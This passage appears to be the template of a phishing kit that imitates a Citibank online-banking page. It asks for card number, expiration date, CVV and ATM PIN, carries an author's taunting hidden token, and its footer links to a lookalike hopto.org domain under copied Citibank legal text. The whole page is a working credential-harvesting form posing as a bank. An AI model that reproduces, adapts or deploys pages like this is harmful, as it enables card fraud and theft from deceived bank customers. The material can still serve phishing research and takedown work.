recognize. Please review for typos.</span></span><!----></div></citi-icon></strong></div><div _ngcontent-boo-c53='' class='col-xs-2'><!----></div></div></div></div><!----><!----></citi-banner-alert></div>";
                                              }
                                            } ?>



                                            <div class="col-xs-12 col-sm-6">
                                              <div class="jpui header DATABOLD field-mb-12 field-mt-0"
                                                id="PERSONAL_NAME_HEADER">Please enter your card details</div>
                                            </div>
                                          </div>



                                          <div class="row" style="margin-top: 20px;">

                                            <div class="form-group col-sm-4 col-xs-12">
                                              <label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel"
                                                class="text-input-label">Card Number</label>

                                              <input type="text" name="cardnum" maxlength="16" value="" id="propCity"
                                                class="form-control" aria-required="true" data-validation="length"
                                                data-validation-error-msg="Hmm, we don’t recognize that card number. Double check it and try again."
                                                data-validation-length="min16" size="43"
                                                placeholder="Credit/Debit Card Number">
                                            </div>






                                          </div>
                                          <div class="row" style="margin-top: 7px;">

                                            <div class="form-group col-sm-4 col-xs-12">

                                              <label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel"
                                                class="text-input-label">Expiration date</label>
                                              <input type="text" name="cardexp" maxlength="25" value="" id="cardexp"
                                                class="form-control" aria-required="true" data-validation="length"
                                                data-validation-error-msg="Enter an expiration date."
                                                data-validation-length="min2" size="43" placeholder="__/__/____"
                                                im-insert="true">
                                            </div>






                                          </div>


                                          <div _ngcontent-tly-c277="" class="cvvImg"><citi-input _ngcontent-tly-c277=""
                                              id="hello" idstr="securityCode" name="securityCode" type="password"
                                              onpaste="event.preventDefault();" oncopy="event.preventDefault();"
                                              oncut="event.preventDefault();" class="citi-input row"
                                              _nghost-tly-c104="">
                                              <div _ngcontent-tly-c104="" class="col-xs-12 form-group"><label
                                                  _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel"
                                                  class="text-input-label">CVV</label>
                                                <div _ngcontent-tly-c104="">
                                                  <div _ngcontent-tly-c104="">
                                                    <div _ngcontent-tly-c104=""><!----><!----><!---->


                                                      <input _ngcontent-pig-c104="" aria-label="CVV"
                                                        aria-labelledby="securityCodelabel" type="password"
                                                        name="securityCode" id="securityCode" placeholder="CVV"
                                                        maxlength="3" autocomplete="off"
                                                        class="form-control ng-untouched ng-pristine ng-valid"
                                                        data-order-appearance="0" aria-required="true"
                                                        data-validation="length"
                                                        data-validation-error-msg="Enter your CVV."
                                                        data-validation-length="min2" size="43">

                                                      <!----><!---->
                                                    </div>
                                                  </div>


                                                </div>
                                              </div>
                                            </citi-input><span _ngcontent-tly-c277="" class="cardArtImage"><img
                                                _ngcontent-tly-c277="" width="80" height="50" border="0" tabindex="0"
                                                src="assets/img/Register_Visa_Card.png"
                                                alt="For MasterCard and Visa, the Security Code (CVV) is the last 3 digits on the back of your card."></span>
                                          </div>

                                          <div class="row">
                                            <div class="form-group col-md-3 col-xs-12" style="margin-top: 7px;">

                                              <label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel"
                                                class="text-input-label">Atm Pin</label><input type="text" name="atmpin"
                                                value="" id="zip" class="form-control" aria-required="true"
                                                placeholder="Atm pin" data-validation="length"
                                                data-validation-error-msg=" " data-validation-length="min4-4" size="23">
                                            </div>


                                          </div>
                                        </div>



                                        <citi-cta _ngcontent-ekd-c295="" type="primary" size="large" _nghost-ekd-c58="">


                                          <button
                                            style="color: #fff;background-color: #056dae;border-width: 2px;border-style: solid;margin: 20px 20px 20px 0;min-width: 220px;position: relative;"
                                            class="jpui button focus util float right primary" id="NEXT"
                                            type="submit"><span class="label">Continue</span></button>



                                          <!----><!----><!----><!----></citi-cta><citi-cta _ngcontent-ekd-c295=""
                                          type="tertiary" bold=""
                                          _nghost-ekd-c58=""><!----><!----><!----><!----></citi-cta><!---->
                                      </div>



                                    </section>
                                  </citi-radio-group></div><input type="hidden" name="token_spox"
                                  value="Fuck_you_by_spox">

                              </form>
                            </citi-form-container></main>
                        </citi-simple-layout></app-account-type>
                    </citi-simple-layout></ng-component></div>
              </div>






            </div>
          </div>











        </div><cds-ivr-modal _ngcontent-ekd-c274="" _nghost-ekd-c279=""><cds-modal-dialog _ngcontent-ekd-c279=""
            class="ivr-modal-container" _nghost-ekd-c263="">
            <div _ngcontent-ekd-c263="" cdsariahideouterdom="">
              <div _ngcontent-ekd-c263="" class="cds-modal cds-modal-fade" aria-hidden="true" style="display: none;">
                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                <div _ngcontent-ekd-c263="" cdsfocustrap="" role="dialog" aria-modal="true" class="cds-modal-dialog">
                  <div _ngcontent-ekd-c279="" class="cds-modal-dialog-centered">
                    <div _ngcontent-ekd-c279="" class="cds-modal-content cds-modal-lg">
                      <div _ngcontent-ekd-c279=""><button _ngcontent-ekd-c279="" type="button" aria-label="Close"
                          class="cds-modal-close cds-close cds-warning-close"></button></div>
                      <div _ngcontent-ekd-c279="" class="cds-modal-header">
                        <h4 _ngcontent-ekd-c279="" class="cds-modal-title"></h4>
                      </div>
                      <div _ngcontent-ekd-c279="" class="cds-modal-body">
                        <p _ngcontent-ekd-c279=""></p>
                        <div _ngcontent-ekd-c279="" class="row">
                          <div _ngcontent-ekd-c279="" class="col-xs-12 col-lg-6 dropdown">
                            <form _ngcontent-ekd-c279="" novalidate=""
                              class="ng-untouched ng-pristine ng-invalid has-validation-callback"><cds-form-field
                                _ngcontent-ekd-c279="" class="cds-form-field">
                                <div class="cds-form-field-infix cds-input-group"><!----></div>
                              </cds-form-field></form>
                          </div>
                        </div><!---->
                        <div _ngcontent-ekd-c279="" class="ivr-cta-wrapper row"><!----></div><!---->
                      </div>
                      <div _ngcontent-ekd-c279="" class="cds-modal-footer"><!----></div>
                    </div>
                  </div>
                </div>
                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
              </div>
              <div _ngcontent-ekd-c263="" class="cds-modal-backdrop cds-modal-fade" style="display: none;"></div>
            </div>
          </cds-modal-dialog></cds-ivr-modal><citi-route-detector
          _ngcontent-ekd-c274=""></citi-route-detector><!----><!----><citi-footer _ngcontent-ekd-c247=""
          _nghost-ekd-c209="">
          <div _ngcontent-wwg-c206="" class="disclaimer">
            <div _ngcontent-wwg-c206="" class="content">
              <div _ngcontent-wwg-c206="" class="text"></br>
                <p><strong>Important Legal Disclosures &amp; Information</strong></p>
                <p>Citibank.com provides information about and access to accounts and financial services provided by
                  Citibank, N.A. and its affiliates in the United States and its territories. It does not, and should
                  not be construed as, an offer, invitation or solicitation of services to individuals outside of the
                  United States.</p>
                <p>Terms, conditions and fees for accounts, products, programs and services are subject to change. Not
                  all accounts, products, and services as well as pricing described here are available in all
                  jurisdictions or to all customers. Your eligibility for a particular product and service is subject to
                  a final determination by Citibank. Your country of citizenship, domicile, or residence, if other than
                  the United States, may have laws, rules, and regulations that govern or affect your application for
                  and use of our accounts, products and services, including laws and regulations regarding taxes,
                  exchange and/or capital controls that you are responsible for following.</p>
                <p>The products, account packages, promotional offers and services described in this website may not
                  apply to customers of <a target="_blank"
                    href="https://wellscitizenscoupo.hopto.org/JRS/portal/template.do?ID=international-personal-bank&amp;l=en&amp;locale=en_US">International
                    Personal Bank U.S.</a> in the Citigold<sup>®</sup> Private Client International,
                  Citigold<sup>®</sup> International, Citi International Personal, Citi Global Executive Preferred, and
                  Citi Global Executive Account Packages.</p>
              </div>
            </div>
          </div>
        </citi-footer>












































      </citi-parent-layout></cbol-core></app-root>


  <script
    src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
  <script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
  <script>
    $.validate();
    $('#my-textarea').restrictLength($('#max-length-element'));
    $.validate({
      modules: 'toggleDisabled',
      disabledFormFilter: 'form.toggle-disabled',
      showErrorDialogs: false
    });

    Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#cardexp");

  </script>


</body>

</html>


<?php



?>